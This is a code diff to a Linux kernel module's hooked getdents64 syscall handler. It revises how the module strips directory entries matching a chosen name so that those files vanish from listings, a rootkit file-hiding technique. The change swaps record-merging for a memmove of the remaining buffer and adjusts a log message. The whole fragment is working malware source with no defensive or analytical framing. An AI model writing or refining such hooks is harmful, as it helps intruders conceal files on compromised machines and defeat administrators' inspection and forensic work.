@@ -95,25 +95,17 @@ asmlinkage ssize_t hooked_getdents64 (unsigned int fd, struct linux_dirent64 __u
         cur_len = orig_dirent->d_reclen;
         remaining_bytes -= cur_len;
         if(0==memcmp(hidename, orig_dirent->d_name, strlen(hidename))) {
-            printk(KERN_INFO "find file:%s\n",orig_dirent->d_name);
-            if(head==orig_dirent) {
-                head=(struct linux_dirent64 *)((char*)orig_dirent+cur_len);
-                orig_dirent = prev = head;
-                result -= cur_len;
-                continue;
-            }
-            else {
-                prev->d_reclen += cur_len;
-                memset((char*)orig_dirent,0,cur_len);
-            }
-            printk(KERN_INFO "hide it\n");
+            printk(KERN_INFO "found a file to hide:%s\n",orig_dirent->d_name);
+            memmove(orig_dirent, ((char*)orig_dirent + cur_len), (size_t)remaining_bytes);
+            result -= cur_len;
+            continue;
         }
         else {
             prev=orig_dirent;
         }
 
         if(remaining_bytes){
-            orig_dirent= (struct linux_dirent64 *) ((char *)prev + prev->d_reclen);
+            orig_dirent = (struct linux_dirent64 *) ((char *)prev + prev->d_reclen);
         }
 
     }
